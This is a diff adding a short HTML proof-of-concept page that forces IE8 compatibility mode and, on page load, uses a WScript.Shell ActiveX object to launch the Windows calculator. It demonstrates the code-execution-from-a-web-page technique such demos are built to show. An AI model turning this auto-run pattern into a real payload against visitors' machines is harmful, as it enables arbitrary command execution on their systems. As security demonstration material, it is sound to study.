@@ -1,0 +1,16 @@
+<html>
+<head>
+<title>Calc PoC</title>
+<meta http-equiv="X-UA-Compatible" content="IE=8" />
+<script type="text/javascript">
+function openNotepad()
+{
+	var cmdShell = new ActiveXObject("WScript.Shell");
+	cmdShell.Run("c:\\Windows\\system32\\calc.exe", 1, true);
+}
+</script>
+</head>
+<body onload="openNotepad()">
+<h1>Calculator PoC</h1>
+</body>
+</html>
